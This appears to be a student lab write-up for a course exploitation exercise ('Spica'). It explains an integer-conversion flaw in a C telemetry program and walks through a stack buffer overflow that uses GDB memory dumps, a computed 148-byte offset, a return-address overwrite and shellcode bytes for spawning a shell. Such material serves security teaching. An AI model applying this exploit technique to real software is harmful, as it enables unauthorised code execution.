# Question 2: Spica Write-up
## Main Idea
#### (A description of the vulnerability)
The code is vulnerable because of a type mismatch between a signed int and an unsigned int. This code involves a bound check however it can be easily bypassed if the attacker provides a negative number. In the following code, if we pass in an negative number for ```size```, the bound check is of no use and when it reaches ```fread```, the function expects a size of unsigned int, however, a signed int ```size``` is provided. C silently typecasts it to an unsigned int after which it  becomes a huge positive number and through this vulnerability we can overwrite anything above msg.
```
    size_t bytes_read = fread(&size, 1, 1, file);
    if (bytes_read == 0 || size > 128)
        return;
    bytes_read = fread(msg, 1, size, file);
```

This is a Integer Conversion Vulenrability. 

## Magic Numbers
#### (How any relevant “magic numbers” were determined, usually with GDB)
We first determined the address of ```msg``` (0xffffd568) and the address of rip of ```display``` function (0xffffd5fc). This was done by invoking GDB and setting a breakpoint on line 7.
```
(gdb) x/64x msg
0xffffd568:     0x00000001      0x00000000      0x00000002      0x00000000
0xffffd578:     0x00000000      0x00000000      0x00000000      0x08048034
0xffffd588:     0x00000020      0x00000006      0x00001000      0x00000000
0xffffd598:     0x00000000      0x0804904a      0x00000000      0x000003ea
0xffffd5a8:     0x000003ea      0x000003ea      0x000003ea      0xffffd78b
0xffffd5b8:     0x0fcbfbfd      0x00000064      0x00000000      0x00000000
0xffffd5c8:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffd5d8:     0x00000000      0xffffd77b      0x00000002      0x00000000
0xffffd5e8:     0x00000000      0x00000000      0x00000000      0xffffdfe2
0xffffd5f8:     0xffffd618      0x080492bd      0xffffd7ab      0x00000000
0xffffd608:     0x00000000      0x00000000      0x00000000      0xffffd630
0xffffd618:     0xffffd6b0      0x08049494      0x00000002      0x0804928d
0xffffd628:     0x0804cfe8      0x08049494      0x00000002      0xffffd6a4
0xffffd638:     0xffffd6b0      0x0804b008      0x00000000      0x00000000
0xffffd648:     0x08049472      0x0804cfe8      0x00000000      0x00000000
0xffffd658:     0x00000000      0x08049097      0x0804928d      0x00000002


(gdb) i f
Stack level 0, frame at 0xffffd600:
 eip = 0x80491ee in display (telemetry.c:8); saved eip = 0x80492bd
 called by frame at 0xffffd630
 source language c.
 Arglist at 0xffffd5f8, args: path=0xffffd7ab "navigation"
 Locals at 0xffffd5f8, Previous frame's sp is 0xffffd600
 Saved registers:
  ebp at 0xffffd5f8, eip at 0xffffd5fc
```
By doing so, we learned that the location of the rip of this function was 148 bytes above the start of ```msg``` (0xffffd5fc - 0xffffd568 = 94 in hex = 148 in decimal).

## Exploit Structure
#### (A description of your exploit structure)
The exploit has four parts:
1. Insert a one byte negative number (0xff) which is read into ```size``` to get around the bound check
2. Write 148 bytes of dummy characters to overwrite everything in between rip of ```display``` and start of ```msg```: ```msg```, compiler padding, and the sfp.
3. Overwrite the rip with the address of the shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with 0xffffd600 (0xffffd5fc + 4).
4. Finally, insert the shellcode directly above the rip.
This causes the ```telemetry``` program to execute the shellcode when it returns from ```display``` function. 


## Exploit GDB Output
#### (GDB output demonstrating the before/after of the exploit working)
When we ran GDB after inputting the malicious string, we got the following output:
```
(gdb) x/64x msg
0xffffd568:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd578:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd588:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd598:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5e8:     0x000000c0      0x41414141      0x41414141      0x41414141
0xffffd5f8:     0x41414141      0xffffd600      0xcd58326a      0x89c38980
0xffffd608:     0x58476ac1      0xc03180cd      0x2f2f6850      0x2f686873
0xffffd618:     0x546e6962      0x8953505b      0xb0d231e1      0x0a80cd0b
0xffffd628:     0x0804cfe8      0x08049494      0x00000002      0xffffd6a4
0xffffd638:     0xffffd6b0      0x0804b008      0x00000000      0x00000000
0xffffd648:     0x08049472      0x0804cfe8      0x00000000      0x00000000
0xffffd658:     0x00000000      0x08049097      0x0804928d      0x00000002
```
After 148 bytes of garbage, the rip is overwritten with 0xffffd600 which points to the shellcode directly above the rip. 

